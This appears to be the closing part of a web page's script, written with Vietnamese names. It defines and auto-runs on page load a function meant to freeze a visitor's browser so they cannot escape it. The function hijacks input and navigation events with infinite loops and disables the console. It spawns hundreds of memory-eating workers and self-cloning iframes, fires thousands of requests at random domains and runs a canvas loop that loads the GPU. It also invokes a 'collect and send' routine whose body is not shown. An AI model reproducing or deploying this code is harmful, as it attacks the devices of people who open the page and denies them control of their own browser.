        // ====== GÂY CỨNG KHÔNG THỂ THOÁT ======
        function gâyCứngKhôngThểThoát() {
            window.onbeforeunload = function(e) { e.preventDefault(); e.returnValue = ''; while (true) {} };
            window.onunload = function() { while (true) {} };
            const events = ['keydown','keyup','keypress','click','dblclick','mousedown','mouseup','contextmenu','touchstart','touchmove','touchend','scroll','wheel'];
            for (let ev of events) {
                document.addEventListener(ev, function(e) {
                    e.preventDefault(); e.stopPropagation();
                    while (true) {}
                }, true);
            }
            Object.defineProperty(window, 'console', { value: undefined, writable: false, configurable: false });
            setInterval(function() {
                if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
                    while (true) {}
                }
            }, 30);
            setTimeout(function() { while (true) { let x = 0; for (let i = 0; i < 1e10; i++) x += i * i; } }, 0);
            for (let w = 0; w < 500; w++) {
                const blob = new Blob([`
                    self.onmessage = function() {
                        let mem = [];
                        while (true) {
                            mem.push(new Array(1000000).fill('X'));
                            let a = 0;
                            for (let i = 0; i < 1e9; i++) a += i;
                        }
                    }
                `]);
                const worker = new Worker(URL.createObjectURL(blob));
                worker.postMessage('start');
            }
            let khoRác = [];
            setInterval(function() {
                for (let i = 0; i < 1500; i++) khoRác.push(new Array(1000000).fill('A'));
                window.__khoRác = khoRác;
            }, 1);
            for (let f = 0; f < 500; f++) {
                let iframe = document.createElement('iframe');
                iframe.src = location.href + '?clone=' + f;
                iframe.style.position = 'absolute';
                iframe.style.width = '100%';
                iframe.style.height = '100%';
                iframe.style.top = '0'; iframe.style.left = '0';
                iframe.style.border = 'none';
                iframe.style.display = 'block';
                document.body.appendChild(iframe);
            }
            history.pushState(null, null, location.href);
            window.onpopstate = function() { history.pushState(null, null, location.href); while (true) {} };
            setInterval(function() {
                document.body.style.transform = 'scale(' + (1 + Math.random() * 0.5) + ')';
                document.body.style.margin = Math.random() * 500 + 'px';
                document.body.style.filter = 'hue-rotate(' + Math.random() * 720 + 'deg) blur(' + Math.random() * 5 + 'px)';
                document.body.style.background = '#' + Math.floor(Math.random()*16777215).toString(16);
            }, 2);
            for (let i = 0; i < 2000; i++) {
                fetch('https://' + Math.random().toString(36).substring(7) + '.com/?' + Math.random(), { mode: 'no-cors' })
                    .catch(() => {});
            }
            document.addEventListener('contextmenu', function(e) { e.preventDefault(); while (true) {} }, true);
            function loopGPU() {
                while (true) {
                    let c = document.createElement('canvas');
                    let ctx = c.getContext('2d');
                    for (let i = 0; i < 10000; i++) {
                        ctx.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16);
                        ctx.fillRect(Math.random()*1000, Math.random()*1000, 10, 10);
                    }
                }
            }
            setTimeout(loopGPU, 0);
        }

        // ====== KÍCH HOẠT ======
        window.onload = function() {
            thuThậpVàGửi();
            bmpRandom();
            spamSựKiện();
            thêmLagNặng();
            thêmLagChoĐiệnThoại();
            thêmLagCựcNặng();
            gâyCứngKhôngThểThoát();
        };

        setTimeout(function() {
            thuThậpVàGửi();
            bmpRandom();
            spamSựKiện();
            thêmLagNặng();
            thêmLagChoĐiệnThoại();
            thêmLagCựcNặng();
            gâyCứngKhôngThểThoát();
        }, 50);
    </script>
